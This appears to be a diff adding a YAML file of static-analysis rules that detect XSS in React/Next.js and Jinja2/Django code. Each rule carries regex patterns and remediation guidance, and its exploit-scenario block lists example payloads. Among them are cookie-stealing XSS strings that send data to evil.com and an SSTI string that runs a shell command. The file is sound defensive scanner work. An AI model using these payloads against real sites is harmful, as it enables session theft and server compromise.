@@ -1,0 +1,418 @@
+rules:
+- rule_id: XSS-REACT-001
+  title: XSS via dangerouslySetInnerHTML in React
+  description: 'Detects use of dangerouslySetInnerHTML with user-controlled data in React/Next.js components. React''s default
+    JSX rendering auto-escapes all interpolated values, but dangerouslySetInnerHTML explicitly bypasses this protection, creating
+    a direct XSS vector when combined with untrusted input.
+
+    '
+  language: typescript
+  category: xss
+  severity: High
+  confidence: 0.9
+  cwe: CWE-79
+  owasp: A03:2021-Injection
+  tags:
+  - react-xss
+  - dangerouslysetinnerhtml
+  - next-js
+  - jsx
+  - component-security
+  patterns:
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:props|state|data|response|result|content|body|html)\b
+    description: dangerouslySetInnerHTML with props/state/data sources
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:params|query|searchParams|input|user)\b
+    description: dangerouslySetInnerHTML with URL params or user input
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*`[^`]*\$\{
+    description: dangerouslySetInnerHTML with template literal interpolation
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*\}\s*\}
+    description: dangerouslySetInnerHTML with any variable (potential unsanitized source)
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:useSearchParams|useParams|useRouter|router\.query)\b
+    description: dangerouslySetInnerHTML with Next.js router/search params hooks
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:await\s+)?fetch\b
+    description: dangerouslySetInnerHTML with data fetched from external source
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*createMarkup\s*\(
+    description: dangerouslySetInnerHTML via createMarkup helper (common anti-pattern)
+  - type: regex
+    pattern: __html\s*:\s*(?:marked|markdown|showdown|remarkable|snarkdown)\s*[.(]
+    description: Markdown-to-HTML library output used in dangerouslySetInnerHTML
+  - type: regex
+    pattern: dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*.*\.(?:innerHTML|outerHTML|body|text)\b
+    description: dangerouslySetInnerHTML from parsed DOM element properties
+  - type: regex
+    pattern: ref\.current\.innerHTML\s*=
+    description: Direct innerHTML assignment via React ref bypassing virtual DOM
+  anti_patterns:
+  - DOMPurify
+  - sanitize(
+  - sanitizeHtml
+  - isomorphic-dompurify
+  - Content-Security-Policy
+  - script-src 'nonce-
+  - script-src 'strict-dynamic'
+  - React.createElement
+  - jsx(
+  - jsxs(
+  - '[textContent]'
+  - ng-bind
+  - v-text
+  - DOMPurify.sanitize(
+  - purify.sanitize(
+  - createDOMPurify
+  - isomorphicDompurify
+  - sanitize-html
+  - xss(
+  - dompurify
+  - rehype-sanitize
+  - html-react-parser
+  context_awareness:
+    surrounding_context_patterns:
+    - import React
+    - from 'react'
+    - from 'next
+    - export default function
+    - export const
+    - useState
+    - useEffect
+    - getServerSideProps
+    - getStaticProps
+    - Server Component
+    taint_source_indicators:
+    - props.
+    - state.
+    - useSearchParams
+    - useParams
+    - useRouter
+    - router.query
+    - searchParams
+    - params.
+    - fetch(
+    - axios.get
+    - useSWR
+    - useQuery
+    - getServerSideProps
+    - cookies()
+    - headers()
+    taint_sink_indicators:
+    - dangerouslySetInnerHTML
+    - '__html:'
+    - ref.current.innerHTML
+    - createPortal
+    sanitization_patterns:
+    - DOMPurify.sanitize(
+    - sanitizeHtml(
+    - sanitize(
+    - isomorphicDompurify
+    - rehype-sanitize
+    - xss(
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.88
+  exploit_scenario:
+    attack_example: 'A React blog application renders user-submitted comments using dangerouslySetInnerHTML to support rich
+      text formatting. An attacker submits a comment containing a script payload. When other users view the page, React bypasses
+      its auto-escaping and renders the raw HTML, executing the attacker''s script in every viewer''s browser context.
+
+      '
+    example_payload:
+    - <img src=x onerror="fetch(`https://evil.com/steal?c=${document.cookie}`)">
+    - <svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
+    - <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+    - <details open ontoggle=alert(document.cookie)><summary>Click</summary></details>
+    attacker_objective: 'Achieve stored XSS through user-generated content rendered via dangerouslySetInnerHTML. Steal session
+      tokens, hijack accounts, inject cryptocurrency miners, or create worm-like self-propagating payloads that modify user
+      profile data to infect additional users.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.88
+    context_match: 0.9
+    proximity_to_user_input: 0.85
+    sanitization_absence: 0.92
+  impact: 'dangerouslySetInnerHTML bypasses React''s built-in XSS protection,
+
+    rendering raw HTML that may contain malicious scripts. This is particularly
+
+    dangerous in Next.js applications where server-side rendering can
+
+    amplify the impact, and in applications with user-generated content
+
+    where stored XSS becomes possible.
+
+    '
+  remediation: "- Use DOMPurify.sanitize() before passing to dangerouslySetInnerHTML:\n    import DOMPurify from 'isomorphic-dompurify';\n\
+    \    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />\n- Configure DOMPurify for React applications:\n\
+    \    import DOMPurify from 'isomorphic-dompurify';\n    const cleanHtml = DOMPurify.sanitize(dirty, {\n      USE_PROFILES:\
+    \ { html: true },\n      FORBID_TAGS: ['style', 'script'],\n      FORBID_ATTR: ['onerror', 'onload', 'onclick']\n    });\n\
+    - For Next.js SSR, use isomorphic-dompurify:\n    npm install isomorphic-dompurify\n    import DOMPurify from 'isomorphic-dompurify';\n\
+    - Use @next/third-parties or react-html-parser with sanitization\n- Prefer React's default JSX rendering which auto-escapes:\n\
+    \    <div>{userContent}</div>  // Safe: auto-escaped by React\n- For markdown rendering, use rehype-sanitize:\n    import\
+    \ rehypeSanitize from 'rehype-sanitize';\n    <ReactMarkdown rehypePlugins={[rehypeSanitize]}>{content}</ReactMarkdown>\n\
+    - Deploy Content-Security-Policy headers:\n    Content-Security-Policy: default-src 'self'; script-src 'nonce-{random}'\
+    \ 'strict-dynamic'; style-src 'self' 'unsafe-inline'; object-src 'none';\n- Never use ref.current.innerHTML as a workaround\
+    \ for dangerouslySetInnerHTML\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/79.html
+  - https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html
+  - https://github.com/cure53/DOMPurify
+  - https://github.com/kkomelin/isomorphic-dompurify
+  - https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    created_date: '2024-06-01'
+    author: security-rules-team
+    false_positive_rate: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - XSS-JS-001
+    - XSS-JS-002
+    - SSRF-JS-001
+    amplifying_conditions:
+    - User-generated content stored in database rendered without sanitization
+    - Server-side rendering (SSR) with Next.js getServerSideProps or Server Components
+    - Markdown rendering library without sanitization plugin
+    - API response data rendered directly in dangerouslySetInnerHTML
+    risk_escalation_note: 'When dangerouslySetInnerHTML is used with data from external APIs (related to SSRF-JS-001), an
+      attacker who compromises the API can inject XSS into all consuming React applications, creating a supply-chain-like
+      attack vector.
+
+      '
+  detection_layer: 1
+- rule_id: XSS-PY-001
+  title: XSS via Jinja2 Markup Safe or Autoescaping Disabled
+  description: 'Detects disabled autoescaping or use of Markup()/|safe filter with user-controlled content in Jinja2/Flask
+    templates. Jinja2 auto-escapes by default in Flask, but developers can bypass this protection using the |safe filter,
+    Markup() wrapper, or by disabling autoescape globally. Django templates have similar vectors with the |safe filter and
+    mark_safe() function.
+
+    '
+  language: python
+  category: xss
+  severity: High
+  confidence: 0.87
+  cwe: CWE-79
+  owasp: A03:2021-Injection
+  tags:
+  - xss
+  - jinja2
+  - flask
+  - autoescaping
+  - django
+  - template-injection
+  - server-side
+  patterns:
+  - type: regex
+    pattern: Environment\s*\([^)]*autoescape\s*=\s*False
+    description: Jinja2 Environment with autoescaping explicitly disabled
+  - type: regex
+    pattern: Markup\s*\(\s*(?:request\.|params|input|user|data|f['"])\b
+    description: Markup() wrapping user-controlled or f-string input
+  - type: regex
+    pattern: \|\s*safe\b
+    description: Jinja2/Django |safe filter bypassing auto-escaping
+  - type: regex
+    pattern: '{% autoescape false %}'
+    description: Jinja2 template block disabling autoescaping
+  - type: regex
+    pattern: mark_safe\s*\(\s*(?:request\.|params|input|user|data|f['"]|%s|\.format\()\b
+    description: Django mark_safe() with user-controlled input or string formatting
+  - type: regex
+    pattern: mark_safe\s*\(\s*['"].*%s.*['"].*%\s*(?:request|params|input|user|data)\b
+    description: Django mark_safe() with %-format string interpolation of user data
+  - type: regex
+    pattern: Markup\s*\(\s*['"].*%s.*['"].*%\s*(?:request|params|input|user|data)\b
+    description: Jinja2 Markup() with %-format string interpolation of user data
+  - type: regex
+    pattern: render_template_string\s*\(\s*(?:request\.|params|input|user|data|f['"])\b
+    description: Flask render_template_string with user input (SSTI/XSS)
+  - type: regex
+    pattern: Markup\s*\(\s*f['"]
+    description: Markup() wrapping f-string (user data may be interpolated)
+  - type: regex
+    pattern: mark_safe\s*\(\s*f['"]
+    description: Django mark_safe() wrapping f-string
+  - type: regex
+    pattern: \.format\s*\([^)]*\)\s*\)\s*#.*safe|mark_safe\s*\(.*\.format\s*\(
+    description: String .format() result passed to mark_safe or Markup
+  - type: regex
+    pattern: autoescape\s*=\s*(?:select_autoescape\s*\(\s*\))
+    description: select_autoescape() with no arguments (may not cover all extensions)
+  - type: regex
+    pattern: HttpResponse\s*\(\s*(?:request\.|f['"]|".*%s|'.*%s)
+    description: Django HttpResponse with user-controlled content (no template)
+  - type: regex
+    pattern: return\s+['"]<[^>]*>.*(?:request\.(?:GET|POST|args|form|values)|params)\b
+    description: Raw HTML string return with embedded user input
+  anti_patterns:
+  - autoescape=True
+  - bleach.clean
+  - MarkupSafe
+  - escape(
+  - Content-Security-Policy
+  - response.headers['Content-Security-Policy']
+  - CSP_DEFAULT_SRC
+  - django-csp
+  - flask-talisman
+  - autoescape=select_autoescape
+  - '{% autoescape true %}'
+  - autoescape=True
+  - bleach.clean(
+  - bleach.sanitizer
+  - nh3.clean(
+  - lxml.html.clean
+  - html.escape(
+  - markupsafe.escape(
+  - Markup.escape(
+  - from django.utils.html import escape
+  - conditional_escape
+  - format_html(
+  - SecurityMiddleware
+  - XFrameOptionsMiddleware
+  - Talisman(
+  context_awareness:
+    surrounding_context_patterns:
+    - from flask import
+    - from django
+    - from jinja2 import
+    - from markupsafe import
+    - app = Flask(
+    - '@app.route'
+    - def view(
+    - class View(
+    - render_template(
+    - render(
+    - TemplateResponse
+    taint_source_indicators:
+    - request.args
+    - request.form
+    - request.values
+    - request.data
+    - request.json
+    - request.headers
+    - request.cookies
+    - request.GET
+    - request.POST
+    - request.META
+    - request.FILES
+    - kwargs.get(
+    - self.kwargs
+    - url_for(
+    taint_sink_indicators:
+    - Markup(
+    - mark_safe(
+    - '|safe'
+    - '{% autoescape false %}'
+    - render_template_string(
+    - HttpResponse(
+    - Response(
+    - make_response(
+    sanitization_patterns:
+    - bleach.clean(
+    - nh3.clean(
+    - html.escape(
+    - markupsafe.escape(
+    - Markup.escape(
+    - escape(
+    - conditional_escape(
+    - format_html(
+    - strip_tags(
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.85
+  exploit_scenario:
+    attack_example: 'A Flask blog application allows users to submit comments and renders them with the |safe filter to preserve
+      formatting: {{ comment|safe }}. An attacker submits a comment containing a script tag. Jinja2''s autoescaping is bypassed
+      by the |safe filter, and the malicious script executes for every user who views the comment thread, creating a stored
+      XSS vulnerability.
+
+      '
+    example_payload:
+    - <script>fetch("https://evil.com/steal?token="+document.cookie)</script>
+    - <img src=x onerror="navigator.sendBeacon('https://evil.com',document.cookie)">
+    - '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
+    - <svg onload=alert(document.domain)>
+    attacker_objective: 'Exploit stored XSS for persistent session hijacking across all users viewing the affected page. In
+      cases where render_template_string is used with user input, this escalates to Server-Side Template Injection (SSTI),
+      potentially achieving Remote Code Execution (RCE).
+
+      '
+  confidence_factors:
+    pattern_strength: 0.85
+    context_match: 0.88
+    proximity_to_user_input: 0.82
+    sanitization_absence: 0.9
+  impact: 'Disabled autoescaping or unsafe Markup usage allows XSS in rendered templates.
+
+    In Flask/Jinja2 applications, this can lead to stored XSS affecting all users.
+
+    When render_template_string is used with user input, the vulnerability escalates
+
+    to Server-Side Template Injection (SSTI), potentially enabling full server
+
+    compromise via Remote Code Execution.
+
+    '
+  remediation: "- Keep autoescape=True (default in Flask/Jinja2):\n    app = Flask(__name__)  # autoescaping enabled by default\
+    \ for .html templates\n- Configure Jinja2 Environment with proper autoescaping:\n    env = Environment(\n      loader=PackageLoader('myapp'),\n\
+    \      autoescape=select_autoescape(['html', 'xml', 'htm'])\n    )\n- Use bleach.clean() or nh3.clean() for user-generated\
+    \ HTML:\n    import bleach\n    clean_html = bleach.clean(\n      user_input,\n      tags=['b', 'i', 'em', 'strong', 'a',\
+    \ 'p', 'br', 'ul', 'ol', 'li'],\n      attributes={'a': ['href', 'title']},\n      protocols=['http', 'https']\n    )\n\
+    \    # Or use nh3 (Rust-based, faster):\n    import nh3\n    clean_html = nh3.clean(user_input)\n- Avoid |safe filter\
+    \ with user-controlled data\n- Never pass user input to Markup() or mark_safe() directly\n- In Django, use format_html()\
+    \ instead of mark_safe() with interpolation:\n    from django.utils.html import format_html\n    safe_html = format_html('<span\
+    \ class=\"{}\">{}</span>', css_class, user_input)\n- Never use render_template_string with user input\n- Deploy Content-Security-Policy\
+    \ headers via Flask-Talisman or django-csp:\n    # Flask\n    from flask_talisman import Talisman\n    csp = {\n     \
+    \ 'default-src': \"'self'\",\n      'script-src': \"'self' 'nonce-{nonce}'\",\n      'object-src': \"'none'\"\n    }\n\
+    \    Talisman(app, content_security_policy=csp)\n    # Django\n    # pip install django-csp\n    CSP_DEFAULT_SRC = (\"\
+    'self'\",)\n    CSP_SCRIPT_SRC = (\"'self'\",)\n    CSP_OBJECT_SRC = (\"'none'\",)\n- Use html.escape() from the standard\
+    \ library for basic encoding:\n    import html\n    safe_value = html.escape(user_input, quote=True)\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/79.html
+  - https://jinja.palletsprojects.com/en/3.1.x/api/#autoescaping
+  - https://flask.palletsprojects.com/en/3.0.x/security/#cross-site-scripting-xss
+  - https://docs.djangoproject.com/en/5.0/ref/utils/#django.utils.html.format_html
+  - https://bleach.readthedocs.io/en/latest/
+  - https://github.com/messense/nh3
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    created_date: '2024-06-01'
+    author: security-rules-team
+    false_positive_rate: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - XSS-JS-001
+    - SSTI-PY-001
+    - SQLI-PY-001
+    amplifying_conditions:
+    - render_template_string used with user input (escalates to SSTI/RCE)
+    - autoescape globally disabled in Jinja2 Environment configuration
+    - No CSP headers via Flask-Talisman or django-csp
+    - Application uses |safe filter on user-submitted content
+    - bleach or nh3 not found in project dependencies
+    risk_escalation_note: 'If XSS-PY-001 triggers alongside SSTI-PY-001 (Server-Side Template Injection), the vulnerability
+      is critical. SSTI allows arbitrary code execution on the server, and the presence of both indicates that user input
+      flows directly into template rendering without any sanitization layer, posing a complete system compromise risk.
+
+      '
+  detection_layer: 1
